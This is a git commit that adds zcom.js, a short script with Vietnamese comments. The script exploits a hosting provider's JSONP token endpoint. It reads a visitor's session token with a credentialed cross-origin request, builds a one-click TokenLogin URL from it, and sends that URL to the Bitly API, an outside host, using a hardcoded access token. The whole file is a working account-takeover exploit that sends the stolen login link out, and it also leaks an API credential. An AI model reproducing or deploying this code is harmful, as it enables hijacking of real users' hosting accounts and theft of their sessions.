1babe75771ffd90696e7b72499ab1d7194f2ada0
VNC Company <41409442+vncloudsco@users.noreply.github.com>
2019-12-16 09:05:32 +0700

    Create zcom.js

---
+++ zcom.js
@@ -0,0 +1,28 @@
+<script type="text/javascript">
+// tien hanh get link co the dang nhap duoc
+              var http = new XMLHttpRequest();
+              http.open("get", "https://domain.z.com/vn/cart/jsonp/GetToken/?callback=", true);
+              http.withCredentials = true;
+              http.onreadystatechange = function() 
+            {
+                if (http.readyState == 4 && http.status == 200) 
+                { 
+                   // alert(this.responseText); 
+                   var domainctl = "https://cp-vn.cloud.z.com/TokenLogin?token="
+                   var str = this.responseText
+                   // alert(exploit)
+                    var content = str.replace(/token/g, '');
+                    var name = content.replace(/[({""});:]/g, "");
+                    var exploit = domainctl+name
+                    alert(exploit)
+                    // thay doi access_token thanh access_token cua ban
+                    var urli = "https://api-ssl.bitly.com/v3/shorten?longUrl="+exploit+"&access_token=bc230f3eb2de566fc27e53b4289a4b51497df3a0"
+                    alert(urli)
+                    var mtdev = new XMLHttpRequest();
+                    mtdev.open("get", urli, true);
+                    mtdev.send();
+                }
+            }
+
+            http.send();
+</script>
